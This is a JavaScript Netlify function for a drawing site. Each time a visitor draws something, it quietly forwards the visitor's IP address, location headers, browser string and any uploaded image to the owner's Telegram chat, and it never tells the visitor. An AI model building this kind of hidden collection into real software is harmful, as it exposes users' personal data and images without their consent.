/*  netlify/functions/notify.js
 *
 *  Sends a Telegram message when someone draws something.
 *
 *  The bot token lives ONLY here, in Netlify's environment variables — never
 *  in the repo and never in anything the browser downloads. The page calls
 *  /.netlify/functions/notify and this forwards it on.
 *
 *  Set these in Netlify → Site configuration → Environment variables:
 *      TELEGRAM_TOKEN     123456:ABC-DEF...      (from @BotFather)
 *      TELEGRAM_CHAT_ID   123456789              (from @userinfobot)
 *
 *  Delete this file and the notify() call in app.js before sharing the site.
 */

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'POST only' };
  }

  const TOKEN = process.env.TELEGRAM_TOKEN;
  const CHAT = process.env.TELEGRAM_CHAT_ID;
  if (!TOKEN || !CHAT) {
    // Missing config should never break the site for the person drawing.
    return { statusCode: 200, body: 'not configured' };
  }

  let body;
  try {
    body = JSON.parse(event.body || '{}');
  } catch {
    return { statusCode: 400, body: 'bad json' };
  }

  const h = event.headers || {};
  const ip = h['x-nf-client-connection-ip'] || h['client-ip'] ||
             (h['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
  const geo = [h['x-country'], h['x-nf-geo']].filter(Boolean).join(' ');
  const agent = (h['user-agent'] || '').slice(0, 120);
  const when = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';

  const lines = [
    '🌀 <b>someone drew something</b>',
    `<b>what:</b> ${esc(body.kind || '?')}${body.detail ? ' — ' + esc(body.detail) : ''}`,
    `<b>epicycles:</b> ${esc(body.arms)} of ${esc(body.terms)}`,
    `<b>points:</b> ${esc(body.points)}`,
    body.kind === 'picture' ? '<b>image:</b> the file as uploaded' : '',
    `<b>when:</b> ${when}`,
    `<b>ip:</b> <code>${esc(ip)}</code>${geo ? ' · ' + esc(geo) : ''}`,
    `<b>browser:</b> ${esc(agent)}`
  ];
  const caption = lines.filter(Boolean).join('\n');

  try {
    const src = body.photo || body.png || '';
    const m = /^data:(image\/[a-z+]+);base64,(.+)$/i.exec(src);
    if (m) {
      const [, mime, b64] = m;                    // png, jpeg, webp, gif...
      const ext = mime.split('/')[1].replace('jpeg', 'jpg');
      const bytes = Buffer.from(b64, 'base64');
      const form = new FormData();
      form.append('chat_id', CHAT);
      form.append('caption', caption);
      form.append('parse_mode', 'HTML');
      form.append('photo', new Blob([bytes], { type: mime }), `source.${ext}`);
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,
                  { method: 'POST', body: form });
    } else {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT, text: caption, parse_mode: 'HTML' })
      });
    }
  } catch (err) {
    console.log('telegram failed:', err.message);   // never surfaced to the page
  }

  return { statusCode: 204, body: '' };
};

function esc(v) {
  return String(v == null ? '?' : v)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
